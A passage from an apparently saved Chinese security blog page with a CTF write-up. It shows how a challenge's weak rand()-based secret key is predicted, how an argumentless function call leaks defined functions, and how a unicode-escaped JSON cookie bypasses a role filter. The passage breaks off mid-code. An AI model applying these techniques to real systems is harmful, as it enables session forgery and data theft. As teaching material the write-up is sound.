@@ -1,0 +1,673 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./安全箱子的秘密  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./安全箱子的秘密  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./安全箱子的秘密  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>安全箱子的秘密 | 离别歌</title>
+<link href="./安全箱子的秘密  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./安全箱子的秘密  离别歌/styles.css" rel="stylesheet"/>
+<link href="./安全箱子的秘密  离别歌/style.css" rel="stylesheet"/>
+<link href="./安全箱子的秘密  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./安全箱子的秘密  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./安全箱子的秘密  离别歌/jquery.min.js"></script>
+<link href="./安全箱子的秘密  离别歌/code.css" rel="stylesheet"/>
+<link href="./安全箱子的秘密  离别歌/button.css" rel="stylesheet"/>
+<link href="./安全箱子的秘密  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./安全箱子的秘密  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/safeboxs-secret.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/safeboxs-secret.html&amp;text=%E5%AE%89%E5%85%A8%E7%AE%B1%E5%AD%90%E7%9A%84%E7%A7%98%E5%AF%86"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/safeboxs-secret.html&amp;title=%E5%AE%89%E5%85%A8%E7%AE%B1%E5%AD%90%E7%9A%84%E7%A7%98%E5%AF%86"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/safeboxs-secret.html&amp;is_video=false&amp;description=%E5%AE%89%E5%85%A8%E7%AE%B1%E5%AD%90%E7%9A%84%E7%A7%98%E5%AF%86"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=%E5%AE%89%E5%85%A8%E7%AE%B1%E5%AD%90%E7%9A%84%E7%A7%98%E5%AF%86&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/safeboxs-secret.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/safeboxs-secret.html&amp;title=%E5%AE%89%E5%85%A8%E7%AE%B1%E5%AD%90%E7%9A%84%E7%A7%98%E5%AF%86"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/safeboxs-secret.html&amp;title=%E5%AE%89%E5%85%A8%E7%AE%B1%E5%AD%90%E7%9A%84%E7%A7%98%E5%AF%86"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/safeboxs-secret.html&amp;title=%E5%AE%89%E5%85%A8%E7%AE%B1%E5%AD%90%E7%9A%84%E7%A7%98%E5%AF%86"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/safeboxs-secret.html&amp;title=%E5%AE%89%E5%85%A8%E7%AE%B1%E5%AD%90%E7%9A%84%E7%A7%98%E5%AF%86"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/safeboxs-secret.html&amp;name=%E5%AE%89%E5%85%A8%E7%AE%B1%E5%AD%90%E7%9A%84%E7%A7%98%E5%AF%86&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">安全箱子的秘密</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2016年6月28日 22:17" itemprop="datePublished">
+                    2016 六月 28 22:17
+                </time>
+</div>
+<div class="article-tag">
+            阅读：3107
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD">三个白帽</a>,
+                
+                <a class="tag-link" href="/tag/ctf">ctf</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<h2 id="0x01-rand"><a class="toclink" href="#0x01-rand">0x01 rand缺陷导致密钥泄露</a></h2>
+<p>目标： <a href="http://0dac0a717c3cf340e.jie.sangebaimao.com:82/index.php"><a href="http://0dac0a717c3cf340e.jie.sangebaimao.com:82/index.php">http://0dac0a717c3cf340e.jie.sangebaimao.com:82/index.php</a></a></p>
+<p>随便写点东西，抓包，发现html源码里有个?x_show_source：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201606/c4051467123573.jpg"><img alt="14660517818113.jpg" src="./安全箱子的秘密  离别歌/thum-c4051467123573.jpg" title="点击查看原图"/></a></p>
+<p>于是访问 <a href="http://0dac0a717c3cf340e.jie.sangebaimao.com:82/index.php?x_show_source"><a href="http://0dac0a717c3cf340e.jie.sangebaimao.com:82/index.php?x_show_source">http://0dac0a717c3cf340e.jie.sangebaimao.com:82/index.php?x_show_source</a></a> ，找到源码。</p>
+<p>分析一下，发现这里每个新的session会生成两个随机字符串，SECRET_KEY和CSRF_TOKEN。其中CSRF_TOKEN是防御CSRF的token，会直接显示在表单中；而SECRET_KEY是类似密钥的东西，在后面需要利用这个密钥给数据签名。</p>
+<p>但密钥是不知道的，这就是本题第一个难点，如何得知密钥。我们看到随机字符串生成函数rand_str：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">rand_str</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">16</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$rand</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="nv">$_str</span> <span class="o">=</span> <span class="s2">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$n</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$_str</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="nv">$rand</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$_str</span><span class="p">{</span><span class="nv">$n</span><span class="p">};</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nb">implode</span><span class="p">(</span><span class="nv">$rand</span><span class="p">);</span>
+<span class="p">}</span> 
+</pre></div>
+<p>可见，这里用的是rand函数生成的随机数。在linux下，PHP的rand函数是调用glibc库中的rand函数，其实现是有缺陷的。可见这篇文章： <a href="http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/"><a href="http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/">http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/</a></a></p>
+<p>其提到一个公式：</p>
+<blockquote>
+<p>state[i] = state[i-3] + state[i-31] </p>
+</blockquote>
+<p>也就是说，rand生成的第i个随机数，等于i-3个随机数加i-31个随机数的和。</p>
+<p>所以，我们只要生成大于32个随机数，就可以陆续推测出后面的随机数是多少了。我们看到代码：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">rand_str</span><span class="p">(</span><span class="mi">6</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'CSRF_TOKEN'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'CSRF_TOKEN'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">rand_str</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>当一个新请求来到时，index.php会先生成6个随机数组成的字符串作为SECRET_KEY，再生成16个随机数组成的字符串CSRF_TOKEN，而且CSRF_TOKEN是已知的。那么一次请求最多生成22个随机数，是不到31的，所以并不能使用上面的公式。</p>
+<p>我们知道HTTP1.1协议支持Keep-Alive，也就是说一个TCP连接支持收发多个HTTP数据包，只要TCP连接不断那么这个随机数生成就是连续的。所以我只需要发送两个带有Keep-Alive的数据包即可拿到一共44个随机数。</p>
+<p>这44个随机数大概是这样的：</p>
+<blockquote>
+<p>a[0]~a[6]未知 + a[7]~a[22]已知 + a[23]~a[28]未知 + a[29]~a[44]已知 </p>
+</blockquote>
+<p>然后我们再次发送不带session的数据包，则再次生成『6未知+16已知』，这时『6未知』就可以推测了。根据公式，a[45] = a[14] + a[42]，而a[14]和a[42]正好是已知的；根据公式，a[50] = a[19] + a[47]，而a[14]和a[42]也是已知的。<br>
+所以，我们是可以推算出a[45]~a[50]这6个随机数的，进而推算出此时的SECRET_KEY。<br>
+当然，实际操作时会有一定误差，一般是推算出来的值比真实值小1。那么，我们一共推算6个随机数，可能的情况就是：</br></br></p>
+<table>
+<thead>
+<tr>
+<th>number 1</th>
+<th>number 2</th>
+<th>number 3</th>
+<th>number 4</th>
+<th>number 5</th>
+<th>number 6</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>a</td>
+<td>b</td>
+<td>c</td>
+<td>d</td>
+<td>e</td>
+<td>f</td>
+</tr>
+<tr>
+<td>a+1</td>
+<td>b+1</td>
+<td>c+1</td>
+<td>d+1</td>
+<td>e+1</td>
+<td>f+1</td>
+</tr>
+</tbody>
+</table>
+<p>做一个笛卡尔乘积，一共得到如下一些情况：</p>
+<div class="codehilite"><pre><span></span>[('a', 'b', 'c', 'd', 'e', 'f'),
+('a', 'b', 'c', 'd', 'e', 'f+1'),
+('a', 'b', 'c', 'd', 'e+1', 'f'),
+('a', 'b', 'c', 'd', 'e+1', 'f+1'),
+('a', 'b', 'c', 'd+1', 'e', 'f'),
+('a', 'b', 'c', 'd+1', 'e', 'f+1'),
+('a', 'b', 'c', 'd+1', 'e+1', 'f'),
+('a', 'b', 'c', 'd+1', 'e+1', 'f+1'),
+('a', 'b', 'c+1', 'd', 'e', 'f'),
+('a', 'b', 'c+1', 'd', 'e', 'f+1'),
+('a', 'b', 'c+1', 'd', 'e+1', 'f'),
+('a', 'b', 'c+1', 'd', 'e+1', 'f+1'),
+('a', 'b', 'c+1', 'd+1', 'e', 'f'),
+('a', 'b', 'c+1', 'd+1', 'e', 'f+1'),
+('a', 'b', 'c+1', 'd+1', 'e+1', 'f'),
+('a', 'b', 'c+1', 'd+1', 'e+1', 'f+1'),
+('a', 'b+1', 'c', 'd', 'e', 'f'),
+('a', 'b+1', 'c', 'd', 'e', 'f+1'),
+('a', 'b+1', 'c', 'd', 'e+1', 'f'),
+('a', 'b+1', 'c', 'd', 'e+1', 'f+1'),
+('a', 'b+1', 'c', 'd+1', 'e', 'f'),
+('a', 'b+1', 'c', 'd+1', 'e', 'f+1'),
+('a', 'b+1', 'c', 'd+1', 'e+1', 'f'),
+('a', 'b+1', 'c', 'd+1', 'e+1', 'f+1'),
+('a', 'b+1', 'c+1', 'd', 'e', 'f'),
+('a', 'b+1', 'c+1', 'd', 'e', 'f+1'),
+('a', 'b+1', 'c+1', 'd', 'e+1', 'f'),
+('a', 'b+1', 'c+1', 'd', 'e+1', 'f+1'),
+('a', 'b+1', 'c+1', 'd+1', 'e', 'f'),
+('a', 'b+1', 'c+1', 'd+1', 'e', 'f+1'),
+('a', 'b+1', 'c+1', 'd+1', 'e+1', 'f'),
+('a', 'b+1', 'c+1', 'd+1', 'e+1', 'f+1'),
+('a+1', 'b', 'c', 'd', 'e', 'f'),
+('a+1', 'b', 'c', 'd', 'e', 'f+1'),
+('a+1', 'b', 'c', 'd', 'e+1', 'f'),
+('a+1', 'b', 'c', 'd', 'e+1', 'f+1'),
+('a+1', 'b', 'c', 'd+1', 'e', 'f'),
+('a+1', 'b', 'c', 'd+1', 'e', 'f+1'),
+('a+1', 'b', 'c', 'd+1', 'e+1', 'f'),
+('a+1', 'b', 'c', 'd+1', 'e+1', 'f+1'),
+('a+1', 'b', 'c+1', 'd', 'e', 'f'),
+('a+1', 'b', 'c+1', 'd', 'e', 'f+1'),
+('a+1', 'b', 'c+1', 'd', 'e+1', 'f'),
+('a+1', 'b', 'c+1', 'd', 'e+1', 'f+1'),
+('a+1', 'b', 'c+1', 'd+1', 'e', 'f'),
+('a+1', 'b', 'c+1', 'd+1', 'e', 'f+1'),
+('a+1', 'b', 'c+1', 'd+1', 'e+1', 'f'),
+('a+1', 'b', 'c+1', 'd+1', 'e+1', 'f+1'),
+('a+1', 'b+1', 'c', 'd', 'e', 'f'),
+('a+1', 'b+1', 'c', 'd', 'e', 'f+1'),
+('a+1', 'b+1', 'c', 'd', 'e+1', 'f'),
+('a+1', 'b+1', 'c', 'd', 'e+1', 'f+1'),
+('a+1', 'b+1', 'c', 'd+1', 'e', 'f'),
+('a+1', 'b+1', 'c', 'd+1', 'e', 'f+1'),
+('a+1', 'b+1', 'c', 'd+1', 'e+1', 'f'),
+('a+1', 'b+1', 'c', 'd+1', 'e+1', 'f+1'),
+('a+1', 'b+1', 'c+1', 'd', 'e', 'f'),
+('a+1', 'b+1', 'c+1', 'd', 'e', 'f+1'),
+('a+1', 'b+1', 'c+1', 'd', 'e+1', 'f'),
+('a+1', 'b+1', 'c+1', 'd', 'e+1', 'f+1'),
+('a+1', 'b+1', 'c+1', 'd+1', 'e', 'f'),
+('a+1', 'b+1', 'c+1', 'd+1', 'e', 'f+1'),
+('a+1', 'b+1', 'c+1', 'd+1', 'e+1', 'f'),
+('a+1', 'b+1', 'c+1', 'd+1', 'e+1', 'f+1')] 
+</pre></div>
+<p>依次试一遍就好了。</p>
+<h2 id="0x02-php"><a class="toclink" href="#0x02-php">0x02 PHP鸡肋任意代码执行</a></h2>
+<p>依次测试上述推测出的SECRET_KEY，当页面返回值不再提示Permission deny!!时，说明预测准确。此时我们拿到了SECRET_KEY，即可计算hmac，实际上计算hmac是为了控制<code>$act</code>，<code>$act</code>是后面PHP执行的函数：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">'md5'</span><span class="p">,</span> <span class="nv">$act</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">])</span> <span class="o">===</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
+   <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$act</span><span class="p">))</span> <span class="p">{</span>
+       <span class="nv">$exec_res</span> <span class="o">=</span> <span class="nv">$act</span><span class="p">();</span>
+       <span class="nx">output</span><span class="p">(</span><span class="nv">$exec_res</span><span class="p">);</span>
+   <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+       <span class="nx">show_error_page</span><span class="p">(</span><span class="s2">"Function not found!!"</span><span class="p">);</span>
+   <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+   <span class="nx">show_error_page</span><span class="p">(</span><span class="s2">"Permission deny!!"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p><code>$act()</code>，这里等于说存在一个『任意代码执行』漏洞。但这个漏洞比较鸡肋，虽然可以执行任意函数，但因为没有传入参数，所以导致执行诸如assert、system之类的函数是没用的，会报错：</p>
+<p>￼<a href="https://www.leavesongs.com/content/uploadfile/201606/74551467123584.jpg"><img alt="14660635298209.jpg" src="./安全箱子的秘密  离别歌/thum-74551467123584.jpg" title="点击查看原图"/></a></p>
+<p>那么，我们只能利用php里一些不含参数的函数。php里有几个get开头的函数，其效果还是蛮强的：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201606/b3d61467123601.jpg"><img alt="14660639680966.jpg" src="./安全箱子的秘密  离别歌/b3d61467123601.jpg" title="点击查看原图"/></a></p>
+<p>主要有以下一些：</p>
+<ol>
+<li>get_defined_functions 可以获取所有已经定义的函数</li>
+<li>get_defined_constants 可以获取所有已经定义的常量</li>
+<li>get_defined_vars 可以获取所有已经定义的变量</li>
+<li>get_included_files 可以获取所有已经包含的文件</li>
+<li>get_loaded_extensions 可以获取所有加载的扩展</li>
+<li>get_declared_classes 可以获取所有已经声明的类</li>
+<li>get_declared_interfaces 可以获取所有已经声明的接口</li>
+</ol>
+<p>其中，第1~4个方法十分致命。一般一个网站加密密钥、数据库配置信息多半存在常量或全局变量中，通过第2、3个方法即可全部获取，而通过第1、4个方法可以大致获取网站结构，了解函数状况。</p>
+<p>这里，我们通过调用get_defined_functions，即可获得一个包含所有已经定义的函数的数组。不过，我们需要设置HTTP头：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">output</span><span class="p">(</span><span class="nv">$obj</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_REQUESTED_WITH'</span><span class="p">])</span> <span class="o">&amp;&amp;</span>
+        <span class="nb">strcasecmp</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_REQUESTED_WITH'</span><span class="p">],</span> <span class="s1">'XMLHttpRequest'</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: application/json"</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: text/html; charset=UTF-8"</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="nb">strval</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>因为我们要获取的是数组，数组直接输出是会被强制转换成字符串的。所以我将X-REQUESTED-WITH设置为XMLHttpRequest，即可让输出结果转换成json，这样数组就被保留了：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201606/04331467123655.jpg"><img alt="14660645664569.jpg" src="./安全箱子的秘密  离别歌/thum-04331467123655.jpg" title="点击查看原图"/></a></p>
+<p>输出所有函数，我发现用户函数中有几个函数在源码中没看到：_fd_init,fd_show_source,fd_config,fd_error,fg_safebox</p>
+<p>分别执行一下，发现fd_show_source是读取源码：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201606/2b871467123869.jpg"><img alt="14660646878115.jpg" src="./安全箱子的秘密  离别歌/thum-2b871467123869.jpg" title="点击查看原图"/></a></p>
+<h2 id="0x03"><a class="toclink" href="#0x03">0x03 提权+任意文件读取漏洞</a></h2>
+<p>整理一下这个源码，发现主要逻辑在fg_safebox函数中，观察一下：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">fg_safebox</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="nx">_fd_init</span><span class="p">();</span>
+    <span class="nv">$config</span> <span class="o">=</span> <span class="nx">fd_config</span><span class="p">();</span>
+    <span class="nv">$action</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'method'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'method'</span><span class="p">]</span> <span class="o">:</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="nv">$role</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"userinfo"</span><span class="p">][</span><span class="s1">'role'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"userinfo"</span><span class="p">][</span><span class="s1">'role'</span><span class="p">]</span> <span class="o">:</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$role</span><span class="p">,</span> <span class="p">[</span><span class="s1">'admin'</span><span class="p">,</span> <span class="s1">'user'</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">fd_error</span><span class="p">(</span><span class="s1">'Permission denied!!'</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$action</span><span class="p">,</span> <span class="nv">$config</span><span class="p">[</span><span class="s1">'role'</span><span class="p">][</span><span class="s1">'admin'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$role</span> <span class="o">!=</span> <span class="s2">"admin"</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">fd_error</span><span class="p">(</span><span class="s1">'Admin permission denied!!'</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nv">$box</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SafeBox</span><span class="p">();</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">method_exists</span><span class="p">(</span><span class="nv">$box</span><span class="p">,</span> <span class="nv">$action</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nb">call_user_func</span><span class="p">([</span><span class="nv">$box</span><span class="p">,</span> <span class="nv">$action</span><span class="p">]);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>先调用了_fd_init()。然后检查用户session[role]是否是admin或user，并检查用户是否有权限执行某函数。</p>
+<p>先看看_fd_init：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">_fd_init</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="c1">//定义role必须为guest</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"userinfo"</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="s2">"role"</span> <span class="o">=&gt;</span> <span class="s2">"guest"</span>
+    <span class="p">];</span>
+    <span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'userinfo'</span><span class="p">])</span> <span class="o">?</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'userinfo'</span><span class="p">])</span> <span class="o">:</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">)</span> <span class="o">||</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nv">$h1</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+    <span class="nv">$h2</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$h1</span> <span class="o">!==</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s2">"md5"</span><span class="p">,</span> <span class="nv">$h2</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//防止身份伪造</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$h2</span><span class="p">,</span> <span class="s2">"admin"</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="o">||</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$h2</span><span class="p">,</span> <span class="s2">"user"</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nv">$s</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$h2</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="nv">$s</span><span class="p">[</span><span class="s1">'role'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">strval</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="s1">'role'</span><span class="p">]);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="s1">'role'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'admin'</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"userinfo"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"userinfo"</span><span class="p">],</span> <span class="nv">$s</span><span class="p">);</span>
+    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>实际上是从cookie中取出信息并用json_decode解码后作为session，我们的目标是控制<code>$_SESSION['userinfo']['role']</code>。有三个地方注意一下就好了：</p>
+<ul>
+<li>cookie中取出的信息先进行签名认证，但因为密钥SECRET_KEY已经拿到了，所以不成问题</li>
+<li>admin和user这两个字符串不能出现在json中，我们可以利用unicode编码，比如{&lt;q&gt;role&lt;/q&gt;: &lt;q&gt;\u0075ser&lt;/q&gt;}</li>
+<li>role的值不能为admin</li>
+</ul>
+<p>主要是第三个问题，role的值不能是admin，那么执行不了read方法：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">private</span> <span class="k">function</span> <span class="nf">_read_file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span>
